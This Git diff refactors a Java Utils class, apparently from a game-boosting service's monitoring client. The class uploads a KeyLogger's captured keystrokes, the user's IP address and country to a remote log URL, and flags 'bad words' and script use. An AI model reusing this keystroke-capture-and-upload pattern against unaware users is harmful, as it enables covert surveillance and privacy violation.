@@ -4,8 +4,8 @@ import com.google.gson.JsonArray;
 import com.google.gson.JsonObject;
 import logger.Globals;
 import logger.KeyLogger;
-import model.User;
 import model.orders.Order;
+import model.User;
 import org.apache.http.HttpResponse;
 import org.apache.http.client.HttpClient;
 import org.apache.http.client.methods.HttpPost;
@@ -15,8 +15,7 @@ import org.json.JSONException;
 import org.json.JSONObject;
 import webService.AWSWebService;
 
-import java.io.IOException;
-import java.io.InputStream;
+import java.io.*;
 import java.text.DateFormat;
 import java.text.SimpleDateFormat;
 import java.time.format.DateTimeFormatter;
@@ -27,46 +26,45 @@ import java.util.Timer;
 
 public class Utils {
 
-    public static boolean foundBadWord = false;
+    private static boolean foundBadWord = false;
     public Boolean scriptAlert = false;
-    private static Timer timer = new Timer();
 
 
     public void uploadLog(User user, Order order) {
-        if(checkForBadWords(KeyLogger.log)) {
+        if(!KeyLogger.logUploaded && KeyLogger.log.size() > 5) {
+            if(checkForBadWords(KeyLogger.log)) {
                 Utils.foundBadWord = true;
-        }
-        JsonObject jsonObject = new JsonObject();
-        JsonArray logFile = new JsonArray();
-        logFile.add("The booster's IP adress is: " + getMyIp() + "\n");
-        logFile.add("The booster's Country is: " + getMyCountry() + "\n");
-        for (String message : KeyLogger.log) {
-            logFile.add(message + "\n");
-        }
-        jsonObject.add("logFile", logFile);
-        jsonObject.addProperty("fileName", createKey(user, order));
+            }
+            JsonObject jsonObject = new JsonObject();
+            JsonArray logFile = new JsonArray();
+            logFile.add("The booster's IP adress is: " + getMyIp() + "\n");
+            logFile.add("The booster's Country is: " + getMyCountry() + "\n");
+            for (String message : KeyLogger.log) {
+                logFile.add(message + "\n");
+            }
+            jsonObject.add("logFile", logFile);
+            jsonObject.addProperty("fileName", createKey(user, order));
 
-        System.out.println(jsonObject);
-        sendJson(Globals.logUploadURL, jsonObject);
+            System.out.println(jsonObject);
+            sendJson(Globals.logUploadURL, jsonObject);
+            KeyLogger.log.clear();
+        }
     }
 
 
-    private boolean sendJson(String url, JsonObject jsonObject) {
+    private void sendJson(String url, JsonObject jsonObject) {
         HttpClient httpClient = HttpClientBuilder.create().build();
 
         try {
-            HttpPost post = new HttpPost(url);
-            StringEntity params = new StringEntity(jsonObject.toString());
-            post.setHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36");
-            post.setEntity(params);
-            HttpResponse response = httpClient.execute(post);
-            System.out.println(" DSADSADSADSADSADSADSADASDASDSADSADSADSAD"+response.getStatusLine().getStatusCode());
-            return true;
+            HttpPost request = new HttpPost(url);
+            StringEntity params =new StringEntity(jsonObject.toString());
+            request.addHeader("content-type", "application/json");
+            request.setEntity(params);
+            HttpResponse response = httpClient.execute(request);
+            System.out.println("status code: " + response.getStatusLine().getStatusCode());
         }catch (Exception ex) {
-            System.out.println("QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ");
             System.out.println(ex);
         }
-        return false;
     }
 
     private boolean checkForBadWords(ArrayList<String> log) {
@@ -83,42 +81,40 @@ public class Utils {
 
     private ArrayList<String> getBadWords () {
         ArrayList<String> badWords = new ArrayList<>();
-        Scanner scanner = null;
+        Scanner scanner;
         scanner = new Scanner(KeyLogger.badWordsFilePath);
         while (scanner.hasNext()) {
             badWords.add(scanner.nextLine());
         }
-        System.out.println(badWords);
-        System.out.println(KeyLogger.message);
         scanner.close();
         return badWords;
     }
 
-    public String createKey(User user, Order order) {
+    private String createKey(User user, Order order) {
         DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy/MM/dd");
         String path = "";
         path += createFileName(user, order) + ".csv";
         return path;
     }
 
-    public String createFileName(User user, Order order) {
+    private String createFileName(User user, Order order) {
         String fileName = "";
         if(foundBadWord) {
-            fileName += "WARNING ";
+            fileName += " WARNING ";
         }
         if (scriptAlert) {
-            fileName += "SCRIPT ALERT ";
+            fileName += " SCRIPT ALERT ";
         }
         fileName += " Booster_ID: " + user.getId() + " ";
         fileName += " Order_id: " + order.getId() + " ";
-        DateFormat dateFormat = new SimpleDateFormat(" yyyy_MM_dd HH_mm_ss");
+        DateFormat dateFormat = new SimpleDateFormat(" yyyy_MM_dd HH_mm_ss ");
         Date date = new Date();
         fileName += dateFormat.format(date);
         System.out.println(fileName);
         return fileName;
     }
 
-    public String getMyIp() {
+    private String getMyIp() {
         try (Scanner s = new Scanner(new java.net.URL("https://api.ipify.org").openStream(), "UTF-8").useDelimiter("\\A")) {
             return s.next();
         } catch (IOException e) {
@@ -126,7 +122,7 @@ public class Utils {
         }
     }
 
-    public String getMyCountry() {
+    private String getMyCountry() {
         try (Scanner s = new Scanner(new java.net.URL("https://usercountry.com/v1.0/json/" + getMyIp()).openStream(), "UTF-8").useDelimiter("\\A")) {
             JSONObject jsonObject = new JSONObject(s.nextLine());
             return jsonObject.get("country").toString();
@@ -152,7 +148,7 @@ public class Utils {
             System.out.println(cmdReturn.toString());
 
         } catch (IOException ex) {
-            System.out.println("ASD");
+            System.out.println(ex);
         }
     }
 
@@ -190,7 +186,7 @@ public class Utils {
             System.out.println(cmdReturn.toString());
 
         } catch (IOException ex) {
-            System.out.println("ASD");
+            System.out.println(ex);
         }
     }
 
